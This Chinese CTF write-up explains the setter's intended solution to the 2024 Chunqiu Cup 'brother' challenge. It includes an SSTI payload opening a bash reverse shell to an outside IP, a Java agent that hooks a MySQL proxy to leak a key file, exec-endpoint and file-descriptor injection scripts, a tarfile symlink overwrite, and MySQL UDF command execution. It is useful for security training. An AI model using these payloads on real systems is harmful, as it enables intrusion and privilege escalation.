# 【WP】2024年春秋杯夏季赛“brother”出题思路详解

> 原文: https://www.ctfiot.com/195033.html
> ID: 195033

题目要求

brother

本题主要考察使用UDF（用户定义函数）进行提权的方法。

核心步骤如下：

1.编写一个可调用系统命令的共享库文件（在Linux系统中使用.so文件）。

2.将共享库文件导入到指定目录。

3.在MySQL数据库中创建使用该共享库的自定义函数。

4.通过调用该自定义函数执行系统命令，从而实现提权。

总体思路

入口为one权限，同为one权限的还有sql-proxy.jar，作为一个代理服务器，主要负责将6666端口的流量转发到本地的3306端口。

two用户运行的api.py中有定时对MySQL进行存活检测的操作，是通过6666端口进行连接的，我们可以通过Javaagent技术劫持该socket输出流向检测程序发送任意文件读取的恶意包，然后将读取结果输出到文件，即可获得远程代码执行的key，进而拿到two用户权限。

three拥有MySQL插件目录的写入权限，且运行的update.py接收来自api.py的数据包，当code为1时将指定的tar.gz文件中的new.bin解压到/updatedir中，利用tarfile的软链接覆盖写入漏洞，将udf.so写入到mysql的插件目录中，然后即可udf提权后读取flag。

入口

入口没什么考察点，普通的ssti，使用以下payload完成反弹shell。

{{lipsum.__globals__['os'].popen('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.134.146.39%2F6666%200%3E%261%22').read()}}

拿到shell后发现flag为root只读权限，需要提权，查看进程发现有以下程序在运行：

one用户

分析sql-proxy.jar，main方法代码如下：

Base64ClassLoader base64ClassLoader = new Base64ClassLoader();Class cls = base64ClassLoader.loadClassFromBase64("yv66......");cls.newInstance();

通过解码base64并加载字节码为一个类后实例化，这里在出题的时候主要是想提升一下agent在hook时候的难度。通过base64解码后反编译可以获得Proxy类的代码：

//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.ctf;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;public class Proxy {    private int c = 0;    public Proxy() {        int sourcePort = 6666;        String destinationHost = "127.0.0.1";        int destinationPort = 3306;        try {            ServerSocket serverSocket = new ServerSocket(sourcePort);            try {                while(true) {                    while(true) {                        try {                            Socket sourceSocket = serverSocket.accept();                            System.out.println(sourceSocket.getRemoteSocketAddress());                            Socket destinationSocket = new Socket(destinationHost, destinationPort);                            Thread sourceToDestination = new Thread(() -> {                                this.forwardData(sourceSocket, destinationSocket);                            });                            sourceToDestination.start();                            Thread destinationToSource = new Thread(() -> {                                this.forwardData(destinationSocket, sourceSocket);                            });                            destinationToSource.start();                        } catch (Exception var10) {                            var10.printStackTrace();                        }                    }                }            } catch (Throwable var11) {                try {                    serverSocket.close();                } catch (Throwable var9) {                    var11.addSuppressed(var9);                }                throw var11;            }        } catch (Exception var12) {            var12.printStackTrace();        }    }    private void forwardData(Socket inputSocket, Socket outputSocket) {        try {            InputStream inputStream = inputSocket.getInputStream();            try {                OutputStream outputStream = outputSocket.getOutputStream();                try {                    byte[] buffer = new byte[1024];                    int read;                    while((read = inputStream.read(buffer)) != -1) {                        this.send(outputStream, buffer, read);                    }                } catch (Throwable var10) {                    if (outputStream != null) {                        try {                            outputStream.close();                        } catch (Throwable var9) {                            var10.addSuppressed(var9);                        }                    }                    throw var10;                }                if (outputStream != null) {                    outputStream.close();                }            } catch (Throwable var11) {                if (inputStream != null) {                    try {                        inputStream.close();                    } catch (Throwable var8) {                        var11.addSuppressed(var8);                    }                }                throw var11;            }            if (inputStream != null) {                inputStream.close();            }        } catch (Exception var12) {            try {                inputSocket.close();                outputSocket.close();            } catch (Exception var7) {            }        }    }    private void send(OutputStream o, byte[] data, int c) throws IOException {        o.write(data, 0, c);        o.flush();    }}

实现了一个流量转发的功能，我们可以hook它的send方法来向客户端发送恶意流量包读取/app/evil.key。

以下是m4x编写的javaagent代码：

Hook.java

package com.test;
import com.sun.tools.attach.VirtualMachine;
import java.lang.instrument.Instrumentation;
import java.util.jar.JarFile;
public class Hook {        public static void main(String[] args) {            String pid = args[0];            String agentPath = args[1];            try {                VirtualMachine vm = VirtualMachine.attach(pid);                vm.loadAgent(agentPath,agentPath);                vm.detach();                System.out.println("Agent attached to process " + pid);            } catch (Exception e) {                e.printStackTrace();            }        }    public static void agentmain(String agentArg, Instrumentation inst) throws Exception {    String hookClass = "com.ctf.Proxy";    String hookMethod = "send";    String hookCode = "java.io.FileWriter writer = new java.io.FileWriter("/tmp/data.log", true);n" +            "            writer.write(new String(data));writer.close();n" +            "        nString file = "/app/evil.key";n" +            "o.write(new byte[]{(byte)(file.length() + 1),0x00,0x00,0x01,(byte)0xfb});n" +            "o.write(file.getBytes());n" +            "o.flush();return;";    inst.appendToBootstrapClassLoaderSearch(new JarFile(agentArg));    HookTransformer socketTransformer = new HookTransformer(hookClass,hookMethod,hookCode,1); // 0、 在方法调用后执行。1、在方法调用前执行 2、直接替换方法体    inst.addTransformer(socketTransformer,true);    Class[] cs = inst.getAllLoadedClasses();
    boolean flag = false;    for (Class a : cs){        if (a.getName().equals(hookClass)){            flag = true;            try {                inst.retransformClasses(a);                System.out.println("成功重转换类：" + hookClass);            } catch (Exception e) {                e.printStackTrace();                System.out.println("重转换失败：" + hookClass);            }        }    }
    if (!flag){        System.out.println("类尚未初始化，无需重转换: " + hookClass);    }
    }
    public static void premain(String agentArg, Instrumentation inst) throws Exception {        agentmain(agentArg,inst);    }}

因为Proxy类是动态加载的，因此需要在我们的agent中也添加上这个类，否则sstis将找不到这个类而报错。直接复制反编译的代码过来即可。

Proxy.java

package com.ctf;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;public class Proxy {    private int c = 0;    public Proxy() {        int sourcePort = 6666;        String destinationHost = "127.0.0.1";        int destinationPort = 3306;        try {            ServerSocket serverSocket = new ServerSocket(sourcePort);            try {                while(true) {                    while(true) {                        try {                            Socket sourceSocket = serverSocket.accept();                            System.out.println(sourceSocket.getRemoteSocketAddress());                            Socket destinationSocket = new Socket(destinationHost, destinationPort);                            Thread sourceToDestination = new Thread(() -> {                                this.forwardData(sourceSocket, destinationSocket);                            });                            sourceToDestination.start();                            Thread destinationToSource = new Thread(() -> {                                this.forwardData(destinationSocket, sourceSocket);                            });                            destinationToSource.start();                        } catch (Exception var10) {                            var10.printStackTrace();                        }                    }                }            } catch (Throwable var11) {                try {                    serverSocket.close();                } catch (Throwable var9) {                    var11.addSuppressed(var9);                }                throw var11;            }        } catch (Exception var12) {            var12.printStackTrace();        }    }    private void forwardData(Socket inputSocket, Socket outputSocket) {        try {            InputStream inputStream = inputSocket.getInputStream();            try {                OutputStream outputStream = outputSocket.getOutputStream();                try {                    byte[] buffer = new byte[1024];                    int read;                    while((read = inputStream.read(buffer)) != -1) {                        this.send(outputStream, buffer, read);                    }                } catch (Throwable var10) {                    if (outputStream != null) {                        try {                            outputStream.close();                        } catch (Throwable var9) {                            var10.addSuppressed(var9);                        }                    }                    throw var10;                }                if (outputStream != null) {                    outputStream.close();                }            } catch (Throwable var11) {                if (inputStream != null) {                    try {                        inputStream.close();                    } catch (Throwable var8) {                        var11.addSuppressed(var8);                    }                }                throw var11;            }            if (inputStream != null) {                inputStream.close();            }        } catch (Exception var12) {            try {                inputSocket.close();                outputSocket.close();            } catch (Exception var7) {            }        }    }    private void send(OutputStream o, byte[] data, int c) throws IOException {        o.write(data, 0, c);        o.flush();    }}

HookTransformer.java

package com.test;
import javassist.*;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;
public class HookTransformer implements ClassFileTransformer {    private ClassPool classPool;    private String hookClass;    private String hookMethod;    private String hookCode;    private int pos = 0;    public HookTransformer(String hookClass, String hookMethod, String HookCode, int pos) throws NotFoundException {        this.hookClass = hookClass;        this.hookMethod = hookMethod;        this.hookCode = HookCode;        this.classPool = new ClassPool();        this.classPool.appendClassPath(new LoaderClassPath(this.getClass().getClassLoader()));        this.classPool.appendSystemPath();        this.pos = pos;    }
    @Override    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,                            ProtectionDomain protectionDomain, byte[] classfileBuffer) {        classPool.appendClassPath(new LoaderClassPath(loader));        if (className.equals(this.hookClass.replace(".","/"))) {            try {                CtClass ctClass = this.classPool.get(this.hookClass);                CtMethod ctMethod = ctClass.getDeclaredMethod(this.hookMethod);                if (this.pos == 0){                    ctMethod.insertAfter(this.hookCode);                } else if (this.pos == 1){                    ctMethod.insertBefore(this.hookCode);                } else if (this.pos == 2){                    ctMethod.setBody(this.hookCode);                } else {                    throw new Exception("必须指定一个代码插入点");                }                byte[] byteCode = ctClass.toBytecode();                ctClass.detach();                return byteCode;            } catch (Exception e) {                e.printStackTrace();            }        }        return null;    }}

这里主要是对jar包的属性进行配置，否则无法正确的attach运行jvm。

pom.xml

<?xml version="1.0" encoding="UTF-8"?>    <modelVersion>4.0.0</modelVersion>
    <groupId>com.test</groupId>    <artifactId>Hook</artifactId>    <version>1.0-SNAPSHOT</version>

            <maven.compiler.source>11</maven.compiler.source>        <maven.compiler.target>11</maven.compiler.target>        UTF-8    
    <dependencies>        <!-- 其他依赖项 -->
        <!-- Javassist 依赖项 -->        <dependency>            <groupId>org.javassist</groupId>            <artifactId>javassist</artifactId>            <version>3.27.0-GA</version> <!-- 使用最新版本 -->        </dependency>
        <!-- 其他依赖项 -->    </dependencies>

                                        <groupId>org.apache.maven.plugins</groupId>                <artifactId>maven-jar-plugin</artifactId>                <version>3.2.0</version> <!-- 使用最新版本 -->                <configuration>                    <archive>                        <manifest>                            <addClasspath>true</addClasspath>                            <classpathPrefix>lib/</classpathPrefix>                            <mainClass>com.test.Hook</mainClass>                        </manifest>                    </archive>                </configuration>            
                            <artifactId>maven-assembly-plugin</artifactId>                <version>3.3.0</version> <!-- 使用最新版本 -->                <configuration>                    <descriptorRefs>                        <descriptorRef>jar-with-dependencies</descriptorRef>                    </descriptorRefs>                    <archive>                        <manifestEntries>                            <Agent-Class>com.test.Hook</Agent-Class>                             <Can-Redefine-Classes>true</Can-Redefine-Classes>                            <Can-Retransform-Classes>true</Can-Retransform-Classes>                        </manifestEntries>                    </archive>                </configuration>                <executions>                    <execution>                        make-assembly <!-- 此处ID可以任意 -->                        package                        <goals>                            <goal>single</goal>                        </goals>                    </execution>                </executions>                        


使用wget将agent的jar包、jattach（git搜jattach第一个）程序从远程下载下来，然后使用以下命令进行attach，第一个参数为sql-proxy的pid，需要根据实际情况来修改。

./jattach 32 load instrument false "/tmp/x.jar=/tmp/x.jar"

完成attach后查看/tmp/data.log可以看到32位的hex，就是evil.key的内容。然后可以使用这个key来对http://127.0.0.1:
5000/evil进行远程代码执行，这里拿下two用户权限。

two用户

two用户运行着api.py，代码如下:

import mysql.connector, time, threading, socket
from flask import Flask, request
app = Flask(__name__)

def mysql_keepalive():    config = {        'user': 'ctf',        'password': '123456',        'host': '127.0.0.1',        'database': 'mysql',        'port': 6666,
    }    try:        db_connection = mysql.connector.connect(**config)        cursor = db_connection.cursor()    
except mysql.connector.Error as err:        print(err)        exit(0)    while True:        try:            cursor.execute("SELECT VERSION();")            cursor.fetchone()        
except mysql.connector.Error as err:            print(f"连接中断: {err}")        time.sleep(10)

def handle_client_connection(client_socket):    try:        while True:            client_socket.send('{"code":0, "path": ""}'.encode('utf-8'))            time.sleep(10)    
except Exception as e:        print(f"Error handling client: {e}")

def update_api():    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    host = '0.0.0.0'    port = 7777    server_socket.bind((host, port))    server_socket.listen(1)    print(f"update_api Listening on port {port}...")    while True:        client_socket, addr = server_socket.accept()        handle_client_connection(client_socket)

@app.route('/evil', methods=['POST'])def evil():    code = request.json['code']    key = request.json['key']    if key == open("./evil.key").read():        exec(code)        return "ok"    else:        return "key error"

if __name__ == '__main__':    threading.Thread(target=mysql_keepalive).start()    threading.Thread(target=update_api).start()    app.run("127.0.0.1", 5000)

上面有个7777端口作为three用户检测更新的服务，但是服务尚未开发完成，每次都会返回code:0 也就不会触发更新，由于我们可以在evil接口执行任意代码，可以利用写文件描述符的方法来向检测更新的客户端socket写入自定义内容使用以下脚本完成：

import requestscode = '''for i in range(3,10):    try:        __import__('os').write(i,b'{"code": 1, "path": "/tmp/update.tar.gz"}')    
except:        pass'''data = {"key": "e43377c2e793ba6be737f759c7fc44f2","code": code}print(requests.post("http://127.0.0.1:
5000/evil",json=data).text)

代码向除了0-2（标准输入输出错误）的文件描述符都发送了payload，由于update程序一直都在保持连接，因此它也会收到该payload。

three用户

运行了专门负责自动更新的update.py脚本。

import jsonimport socketimport tarfile
def extract_specific_file(tar_path, file_name, extract_path):    with tarfile.open(tar_path, "r:gz") as tar:        file_info = tar.getmember(file_name)        tar.extract(file_info, path=extract_path)        print("ok")
s = socket.socket()s.connect(("127.0.0.1", 7777))while True:    data = s.recv(1024)    try:        js = json.loads(data)        if js['code'] == 1:            extract_specific_file(js['path'], 'new.bin', "/updatedir")    
except:        s.send(b'Error')

当code为1时将提取path指定的tar.gz文件，并提取里面的new.bin存放到/updatedir，由于只提取一个文件，无法使用目录穿越，这里可以利用链接覆盖写入的漏洞将so文件写入到MySQL插件目录下，首先生成一个包含链接的tar.gz文件。

ln -s /usr/lib/mysql/plugin/udf.so /root/new.bintar -cvzf update.tar.gz

使用以下exp来完成第一个更新。

import requestscode = '''for i in range(3,10):    try:        __import__('os').write(i,b'{"code": 1, "path": "/tmp/update.tar.gz"}')    
except:        pass'''data = {"key": "e43377c2e793ba6be737f759c7fc44f2","code": code}print(requests.post("http://127.0.0.1:
5000/evil",json=data).text)

然后将真正的udf.so改名为new.bin，并压缩为update1.tar.gz，使用以下exp来完成第二个更新。

import requestscode = '''for i in range(3,10):    try:        __import__('os').write(i,b'{"code": 1, "path": "/tmp/update1.tar.gz"}')    
except:        pass'''data = {"key": "e43377c2e793ba6be737f759c7fc44f2","code": code}print(requests.post("http://127.0.0.1:
5000/evil",json=data).text)

以上的更新包需要使用wget从远端下载到/tmp目录下，到这里就可以使用udf提权来完成读取flag了：

mysql -uctf -p123456 -e 'CREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so";'mysql -uctf -p123456 -e 'select sys_eval("chmod 777 /flag");'

共赴未来

随着2024春秋杯网络安全联赛夏季赛的圆满结束，我们深知这场技术盛宴对于每一位参与者来说，不仅是一次技能的展示，更是一次宝贵的学习与成长机会。为了延续这份热情，让更多人能够深入探索网络安全技术的奥秘，我们已将后续题目陆续上线至i春秋的CTF大本营，并将在春秋伽玛公众号中持续发布题目的writeup，供大家一同学习交流。

链接：https://www.ichunqiu.com/competition

+ + + + + + + + + + +

关于伽玛实验室

     伽玛实验室(GAMELAB)聚焦网络安全竞赛研究领域，覆盖网络安全赛事开发、技术研究、赛制设计、赛题研发等方向。秉承“万物皆可赛”的信念，研究内容涉及WEB渗透、密码学、二进制、AI、自动化利用、工控等多个重点方向，并将5G、大数据、区块链等新型技术与网安竞赛进行融合，检验新型技术应用安全性的同时，训练网安人员的实战能力。同时，不断创新比赛形式，积极推动反作弊运动，维护网安竞赛健康长远发展。团队成员以95后为主，是支极具极客精神的年轻团队。


```
{{lipsum.__globals__['os'].popen('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.134.146.39%2F6666%200%3E%261%22').read()}}
Base64ClassLoader base64ClassLoader = new Base64ClassLoader();Class cls = base64ClassLoader.loadClassFromBase64("yv66......");cls.newInstance();
//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.ctf;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;public class Proxy {    private int c = 0;    public Proxy() {        int sourcePort = 6666;        String destinationHost = "127.0.0.1";        int destinationPort = 3306;        try {            ServerSocket serverSocket = new ServerSocket(sourcePort);            try {                while(true) {                    while(true) {                        try {                            Socket sourceSocket = serverSocket.accept();                            System.out.println(sourceSocket.getRemoteSocketAddress());                            Socket destinationSocket = new Socket(destinationHost, destinationPort);                            Thread sourceToDestination = new Thread(() -> {                                this.forwardData(sourceSocket, destinationSocket);                            });                            sourceToDestination.start();                            Thread destinationToSource = new Thread(() -> {                                this.forwardData(destinationSocket, sourceSocket);                            });                            destinationToSource.start();                        } catch (Exception var10) {                            var10.printStackTrace();                        }                    }                }            } catch (Throwable var11) {                try {                    serverSocket.close();                } catch (Throwable var9) {                    var11.addSuppressed(var9);                }                throw var11;            }        } catch (Exception var12) {            var12.printStackTrace();        }    }    private void forwardData(Socket inputSocket, Socket outputSocket) {        try {            InputStream inputStream = inputSocket.getInputStream();            try {                OutputStream outputStream = outputSocket.getOutputStream();                try {                    byte[] buffer = new byte[1024];                    int read;                    while((read = inputStream.read(buffer)) != -1) {                        this.send(outputStream, buffer, read);                    }                } catch (Throwable var10) {                    if (outputStream != null) {                        try {                            outputStream.close();                        } catch (Throwable var9) {                            var10.addSuppressed(var9);                        }                    }                    throw var10;                }                if (outputStream != null) {                    outputStream.close();                }            } catch (Throwable var11) {                if (inputStream != null) {                    try {                        inputStream.close();                    } catch (Throwable var8) {                        var11.addSuppressed(var8);                    }                }                throw var11;            }            if (inputStream != null) {                inputStream.close();            }        } catch (Exception var12) {            try {                inputSocket.close();                outputSocket.close();            } catch (Exception var7) {            }        }    }    private void send(OutputStream o, byte[] data, int c) throws IOException {        o.write(data, 0, c);        o.flush();    }}
package com.test;
import com.sun.tools.attach.VirtualMachine;
import java.lang.instrument.Instrumentation;
import java.util.jar.JarFile;
public class Hook {        public static void main(String[] args) {            String pid = args[0];            String agentPath = args[1];            try {                VirtualMachine vm = VirtualMachine.attach(pid);                vm.loadAgent(agentPath,agentPath);                vm.detach();                System.out.println("Agent attached to process " + pid);            } catch (Exception e) {                e.printStackTrace();            }        }    public static void agentmain(String agentArg, Instrumentation inst) throws Exception {    String hookClass = "com.ctf.Proxy";    String hookMethod = "send";    String hookCode = "java.io.FileWriter writer = new java.io.FileWriter("/tmp/data.log", true);n" +            "            writer.write(new String(data));writer.close();n" +            "        nString file = "/app/evil.key";n" +            "o.write(new byte[]{(byte)(file.length() + 1),0x00,0x00,0x01,(byte)0xfb});n" +            "o.write(file.getBytes());n" +            "o.flush();return;";    inst.appendToBootstrapClassLoaderSearch(new JarFile(agentArg));    HookTransformer socketTransformer = new HookTransformer(hookClass,hookMethod,hookCode,1); // 0、 在方法调用后执行。1、在方法调用前执行 2、直接替换方法体    inst.addTransformer(socketTransformer,true);    Class[] cs = inst.getAllLoadedClasses();
    boolean flag = false;    for (Class a : cs){        if (a.getName().equals(hookClass)){            flag = true;            try {                inst.retransformClasses(a);                System.out.println("成功重转换类：" + hookClass);            } catch (Exception e) {                e.printStackTrace();                System.out.println("重转换失败：" + hookClass);            }        }    }
    if (!flag){        System.out.println("类尚未初始化，无需重转换: " + hookClass);    }
    }
    public static void premain(String agentArg, Instrumentation inst) throws Exception {        agentmain(agentArg,inst);    }}
package com.ctf;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;public class Proxy {    private int c = 0;    public Proxy() {        int sourcePort = 6666;        String destinationHost = "127.0.0.1";        int destinationPort = 3306;        try {            ServerSocket serverSocket = new ServerSocket(sourcePort);            try {                while(true) {                    while(true) {                        try {                            Socket sourceSocket = serverSocket.accept();                            System.out.println(sourceSocket.getRemoteSocketAddress());                            Socket destinationSocket = new Socket(destinationHost, destinationPort);                            Thread sourceToDestination = new Thread(() -> {                                this.forwardData(sourceSocket, destinationSocket);                            });                            sourceToDestination.start();                            Thread destinationToSource = new Thread(() -> {                                this.forwardData(destinationSocket, sourceSocket);                            });                            destinationToSource.start();                        } catch (Exception var10) {                            var10.printStackTrace();                        }                    }                }            } catch (Throwable var11) {                try {                    serverSocket.close();                } catch (Throwable var9) {                    var11.addSuppressed(var9);                }                throw var11;            }        } catch (Exception var12) {            var12.printStackTrace();        }    }    private void forwardData(Socket inputSocket, Socket outputSocket) {        try {            InputStream inputStream = inputSocket.getInputStream();            try {                OutputStream outputStream = outputSocket.getOutputStream();                try {                    byte[] buffer = new byte[1024];                    int read;                    while((read = inputStream.read(buffer)) != -1) {                        this.send(outputStream, buffer, read);                    }                } catch (Throwable var10) {                    if (outputStream != null) {                        try {                            outputStream.close();                        } catch (Throwable var9) {                            var10.addSuppressed(var9);                        }                    }                    throw var10;                }                if (outputStream != null) {                    outputStream.close();                }            } catch (Throwable var11) {                if (inputStream != null) {                    try {                        inputStream.close();                    } catch (Throwable var8) {                        var11.addSuppressed(var8);                    }                }                throw var11;            }            if (inputStream != null) {                inputStream.close();            }        } catch (Exception var12) {            try {                inputSocket.close();                outputSocket.close();            } catch (Exception var7) {            }        }    }    private void send(OutputStream o, byte[] data, int c) throws IOException {        o.write(data, 0, c);        o.flush();    }}
package com.test;
import javassist.*;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;
public class HookTransformer implements ClassFileTransformer {    private ClassPool classPool;    private String hookClass;    private String hookMethod;    private String hookCode;    private int pos = 0;    public HookTransformer(String hookClass, String hookMethod, String HookCode, int pos) throws NotFoundException {        this.hookClass = hookClass;        this.hookMethod = hookMethod;        this.hookCode = HookCode;        this.classPool = new ClassPool();        this.classPool.appendClassPath(new LoaderClassPath(this.getClass().getClassLoader()));        this.classPool.appendSystemPath();        this.pos = pos;    }
    @Override    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,                            ProtectionDomain protectionDomain, byte[] classfileBuffer) {        classPool.appendClassPath(new LoaderClassPath(loader));        if (className.equals(this.hookClass.replace(".","/"))) {            try {                CtClass ctClass = this.classPool.get(this.hookClass);                CtMethod ctMethod = ctClass.getDeclaredMethod(this.hookMethod);                if (this.pos == 0){                    ctMethod.insertAfter(this.hookCode);                } else if (this.pos == 1){                    ctMethod.insertBefore(this.hookCode);                } else if (this.pos == 2){                    ctMethod.setBody(this.hookCode);                } else {                    throw new Exception("必须指定一个代码插入点");                }                byte[] byteCode = ctClass.toBytecode();                ctClass.detach();                return byteCode;            } catch (Exception e) {                e.printStackTrace();            }        }        return null;    }}
<?xml version="1.0" encoding="UTF-8"?>    <modelVersion>4.0.0</modelVersion>
    <groupId>com.test</groupId>    <artifactId>Hook</artifactId>    <version>1.0-SNAPSHOT</version>

            <maven.compiler.source>11</maven.compiler.source>        <maven.compiler.target>11</maven.compiler.target>        UTF-8    
    <dependencies>        <!-- 其他依赖项 -->
        <!-- Javassist 依赖项 -->        <dependency>            <groupId>org.javassist</groupId>            <artifactId>javassist</artifactId>            <version>3.27.0-GA</version> <!-- 使用最新版本 -->        </dependency>
        <!-- 其他依赖项 -->    </dependencies>

                                        <groupId>org.apache.maven.plugins</groupId>                <artifactId>maven-jar-plugin</artifactId>                <version>3.2.0</version> <!-- 使用最新版本 -->                <configuration>                    <archive>                        <manifest>                            <addClasspath>true</addClasspath>                            <classpathPrefix>lib/</classpathPrefix>                            <mainClass>com.test.Hook</mainClass>                        </manifest>                    </archive>                </configuration>            
                            <artifactId>maven-assembly-plugin</artifactId>                <version>3.3.0</version> <!-- 使用最新版本 -->                <configuration>                    <descriptorRefs>                        <descriptorRef>jar-with-dependencies</descriptorRef>                    </descriptorRefs>                    <archive>                        <manifestEntries>                            <Agent-Class>com.test.Hook</Agent-Class>                             <Can-Redefine-Classes>true</Can-Redefine-Classes>                            <Can-Retransform-Classes>true</Can-Retransform-Classes>                        </manifestEntries>                    </archive>                </configuration>                <executions>                    <execution>                        make-assembly <!-- 此处ID可以任意 -->                        package                        <goals>                            <goal>single</goal>                        </goals>                    </execution>                </executions>                        

./jattach 32 load instrument false "/tmp/x.jar=/tmp/x.jar"
import mysql.connector, time, threading, socket
from flask import Flask, request
app = Flask(__name__)

def mysql_keepalive():    config = {        'user': 'ctf',        'password': '123456',        'host': '127.0.0.1',        'database': 'mysql',        'port': 6666,
    }    try:        db_connection = mysql.connector.connect(**config)        cursor = db_connection.cursor()    
except mysql.connector.Error as err:        print(err)        exit(0)    while True:        try:            cursor.execute("SELECT VERSION();")            cursor.fetchone()        
except mysql.connector.Error as err:            print(f"连接中断: {err}")        time.sleep(10)

def handle_client_connection(client_socket):    try:        while True:            client_socket.send('{"code":0, "path": ""}'.encode('utf-8'))            time.sleep(10)    
except Exception as e:        print(f"Error handling client: {e}")

def update_api():    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    host = '0.0.0.0'    port = 7777    server_socket.bind((host, port))    server_socket.listen(1)    print(f"update_api Listening on port {port}...")    while True:        client_socket, addr = server_socket.accept()        handle_client_connection(client_socket)

@app.route('/evil', methods=['POST'])def evil():    code = request.json['code']    key = request.json['key']    if key == open("./evil.key").read():        exec(code)        return "ok"    else:        return "key error"

if __name__ == '__main__':    threading.Thread(target=mysql_keepalive).start()    threading.Thread(target=update_api).start()    app.run("127.0.0.1", 5000)
import requestscode = '''for i in range(3,10):    try:        __import__('os').write(i,b'{"code": 1, "path": "/tmp/update.tar.gz"}')    
except:        pass'''data = {"key": "e43377c2e793ba6be737f759c7fc44f2","code": code}print(requests.post("http://127.0.0.1:
5000/evil",json=data).text)
import jsonimport socketimport tarfile
def extract_specific_file(tar_path, file_name, extract_path):    with tarfile.open(tar_path, "r:gz") as tar:        file_info = tar.getmember(file_name)        tar.extract(file_info, path=extract_path)        print("ok")
s = socket.socket()s.connect(("127.0.0.1", 7777))while True:    data = s.recv(1024)    try:        js = json.loads(data)        if js['code'] == 1:            extract_specific_file(js['path'], 'new.bin', "/updatedir")    
except:        s.send(b'Error')
ln -s /usr/lib/mysql/plugin/udf.so /root/new.bintar -cvzf update.tar.gz
import requestscode = '''for i in range(3,10):    try:        __import__('os').write(i,b'{"code": 1, "path": "/tmp/update.tar.gz"}')    
except:        pass'''data = {"key": "e43377c2e793ba6be737f759c7fc44f2","code": code}print(requests.post("http://127.0.0.1:
5000/evil",json=data).text)
import requestscode = '''for i in range(3,10):    try:        __import__('os').write(i,b'{"code": 1, "path": "/tmp/update1.tar.gz"}')    
except:        pass'''data = {"key": "e43377c2e793ba6be737f759c7fc44f2","code": code}print(requests.post("http://127.0.0.1:
5000/evil",json=data).text)
mysql -uctf -p123456 -e 'CREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so";'mysql -uctf -p123456 -e 'select sys_eval("chmod 777 /flag");'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/1-1721618347.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/7-1721618348.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/9-1721618349.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/4-1721618350.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/9-1721618351.jpeg)